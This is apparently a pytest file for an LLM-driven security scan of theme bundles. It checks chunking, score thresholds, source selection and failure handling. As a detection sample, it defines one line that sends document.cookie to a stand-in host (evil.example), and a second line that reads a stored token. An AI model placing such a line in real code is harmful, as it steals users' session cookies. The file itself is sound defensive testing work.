"""PRD-261 C-02a — the LLM stage of a theme's review (``services/themes/llm_stage.py``).

The Anthropic call is replaced by a fake that answers each chunk as the Messages API would; no
test reaches the network. Proven here: a large bundle is cut into chunks, one call each, with
one combined score; ``source/`` is read when present and preferred; the plugin scanner's
thresholds; and every way the stage can fail to run is a warning "LLM stage did not run",
never a pass.
"""
from __future__ import annotations

import json
import sys
import threading
from pathlib import Path
from types import SimpleNamespace

import pytest

ORCH_ROOT = Path(__file__).resolve().parent.parent
if str(ORCH_ROOT) not in sys.path:
    sys.path.insert(0, str(ORCH_ROOT))

from config import config  # noqa: E402
from services.themes import llm_stage  # noqa: E402
from services.themes.llm_stage import DID_NOT_RUN, llm_check, run_llm_stage  # noqa: E402

EVIL = "navigator.sendBeacon('https://evil.example/steal', document.cookie)"
SUSPECT = "localStorage.getItem('token')"


def _reply(score: int, summary: str = "", findings=()):
    text = json.dumps({"risk_score": score, "findings": list(findings), "summary": summary})
    return SimpleNamespace(content=[SimpleNamespace(type="text", text=text)],
                           usage=SimpleNamespace(input_tokens=100, output_tokens=10))


class FakeLLM:
    """Answers each chunk: 85 when it holds EVIL, 40 for SUSPECT, else 0; records every prompt."""

    def __init__(self, fail_on: str = "", raw: str = ""):
        self.prompts = []
        self.models = []
        self.fail_on = fail_on
        self.raw = raw
        self._lock = threading.Lock()

    def __call__(self, model, text):
        with self._lock:
            self.prompts.append(text)
            self.models.append(model)
        if self.fail_on and self.fail_on in text:
            raise ConnectionError("the API is down")
        if self.raw:
            return SimpleNamespace(content=[SimpleNamespace(type="text", text=self.raw)],
                                   usage=SimpleNamespace(input_tokens=1, output_tokens=1))
        if EVIL in text:
            finding = {"category": "Exfiltration", "severity": "critical", "description": "sends cookies away",
                       "file": "", "evidence": EVIL}
            return _reply(85, "Sends the session cookie to another host.", [finding])
        return _reply(40, "Reads a stored token.") if SUSPECT in text else _reply(0, "No security issues found.")


@pytest.fixture
def small_chunks(monkeypatch):
    """Chunks of 100 tokens (300 characters), so a few KB of code is several chunks."""
    monkeypatch.setattr(config, "THEME_LLM_CHUNK_TOKENS", 100, raising=False)
    monkeypatch.setattr(config, "THEME_LLM_MAX_CHUNKS", 48, raising=False)


def _bundle(lines: int, inject: str = "") -> bytes:
    body = [f"export const value{n} = {n};" for n in range(lines)]
    if inject:
        body.insert(lines // 2, inject)
    return "\n".join(body).encode("utf-8")


def _files(**extra) -> dict:
    return {"theme.json": b"{}", "dist/entry.js": _bundle(5), "dist/theme.css": b".hello{}", **extra}


# ---------------------------------------------------------------------------
# Chunks: one call each, one combined score
# ---------------------------------------------------------------------------


def test_a_large_bundle_makes_several_calls_and_one_combined_score(small_chunks):
    fake = FakeLLM()
    result = run_llm_stage(_files(**{"dist/chunks/big.js": _bundle(200, EVIL)}), call=fake)

    assert result.chunks > 3 and result.calls == result.chunks == len(fake.prompts)
    assert result.ran is True and result.reason is None
    assert result.risk_score == 85  # the highest chunk decides
    assert result.tokens_used == 110 * result.calls
    assert [finding["file"] for finding in result.findings] == ["dist/chunks/big.js"]
    assert llm_check(result)["level"] == "error"
    assert set(fake.models) == {config.PLUGIN_LLM_SCAN_MODEL}


def test_each_chunk_stays_under_its_cap_cut_at_line_ends_and_nothing_is_lost(small_chunks):
    text = _bundle(200).decode()
    chunks = llm_stage.chunk_files({"dist/entry.js": text}, 100)

    assert all(len(chunk.text) <= 100 * llm_stage.CHARS_PER_TOKEN for chunk in chunks)
    assert all(chunk.text.endswith("\n") for chunk in chunks[:-1])
    assert "".join(chunk.text for chunk in chunks) == text
    assert [(chunk.part, chunk.parts) for chunk in chunks][:2] == [(1, len(chunks)), (2, len(chunks))]


def test_a_minified_line_longer_than_a_chunk_is_cut_anyway(small_chunks):
    line = "a" * 1000
    chunks = llm_stage.chunk_files({"dist/entry.js": line}, 100)

    assert len(chunks) == 4 and "".join(chunk.text for chunk in chunks) == line


def test_every_prompt_names_its_file_and_part(small_chunks):
    fake = FakeLLM()
    run_llm_stage(_files(**{"dist/chunks/big.js": _bundle(200)}), call=fake)

    assert all("--- FILE: " in prompt and " (part " in prompt for prompt in fake.prompts)
    assert any("--- FILE: dist/chunks/big.js (part 2 of " in prompt for prompt in fake.prompts)


def test_a_mid_score_is_a_warning_and_a_clean_bundle_passes(small_chunks):
    assert llm_check(run_llm_stage(_files(**{"dist/chunks/a.js": SUSPECT.encode()}), call=FakeLLM()))["level"] == "warning"
    clean = run_llm_stage(_files(), call=FakeLLM())
    assert (clean.risk_score, llm_check(clean)["level"], llm_check(clean)["status"]) == (0, "pass", "ran")


def test_the_thresholds_are_the_plugin_scanners():
    source = (ORCH_ROOT / "core/services/plugin_security_scanner.py").read_text(encoding="utf-8")
    assert "risk_score >= 70" in source and "risk_score >= 20" in source
    assert (llm_stage.BLOCK_AT, llm_stage.REVIEW_AT) == (70, 20)


# ---------------------------------------------------------------------------
# What is read
# ---------------------------------------------------------------------------


def test_source_is_read_instead_of_dist_when_present_and_preferred(small_chunks):
    fake = FakeLLM()
    result = run_llm_stage(_files(**{"source/src/index.tsx": b"export {}", "source/package.json": b"{}"}), call=fake)

    assert result.read == "source" and result.files == ["source/package.json", "source/src/index.tsx"]
    assert not any("dist/" in prompt for prompt in fake.prompts)


def test_dist_is_read_when_the_caller_does_not_prefer_source_or_there_is_none(small_chunks):
    with_source = _files(**{"source/src/index.tsx": b"export {}"})
    assert run_llm_stage(with_source, prefer_source=False, call=FakeLLM()).read == "dist"
    result = run_llm_stage(_files(), call=FakeLLM())
    assert result.read == "dist" and result.files == ["dist/entry.js", "dist/theme.css"]


# ---------------------------------------------------------------------------
# Never safe when it did not run
# ---------------------------------------------------------------------------


def test_no_key_means_the_stage_did_not_run_a_warning_never_a_pass(monkeypatch):
    monkeypatch.setattr(config, "ANTHROPIC_API_KEY", "")
    result = run_llm_stage(_files())
    check = llm_check(result)

    assert (result.ran, result.calls, check["status"], check["level"]) == (False, 0, "did_not_run", "warning")
    assert check["reason"].startswith(DID_NOT_RUN) and "ANTHROPIC_API_KEY" in check["reason"]


def test_a_failing_call_is_a_warning_and_never_raises(small_chunks):
    result = run_llm_stage(_files(**{"dist/chunks/a.js": b"// boom"}), call=FakeLLM(fail_on="boom"))
    check = llm_check(result)

    assert result.ran is False and check["level"] == "warning" and check["reason"].startswith(DID_NOT_RUN)
    assert check["status"] == "partial" and "1 part(s) got no usable answer" in check["reason"]


def test_a_reply_that_is_not_json_is_a_warning(small_chunks):
    check = llm_check(run_llm_stage(_files(), call=FakeLLM(raw="I think it is fine.")))
    assert (check["status"], check["level"], check["calls"]) == ("did_not_run", "warning", 0)


def test_a_failed_part_never_hides_a_blocking_one(small_chunks):
    files = _files(**{"dist/chunks/a.js": b"// boom", "dist/chunks/b.js": EVIL.encode()})
    assert llm_check(run_llm_stage(files, call=FakeLLM(fail_on="boom")))["level"] == "error"


def test_parts_over_the_limit_are_not_read_and_the_stage_says_so(small_chunks, monkeypatch):
    monkeypatch.setattr(config, "THEME_LLM_MAX_CHUNKS", 2, raising=False)
    fake = FakeLLM()
    result = run_llm_stage(_files(**{"dist/chunks/big.js": _bundle(200)}), call=fake)

    assert len(fake.prompts) == 2 and result.chunks > 2 and result.ran is False
    assert "over the limit of 2 parts" in result.reason and llm_check(result)["level"] == "warning"
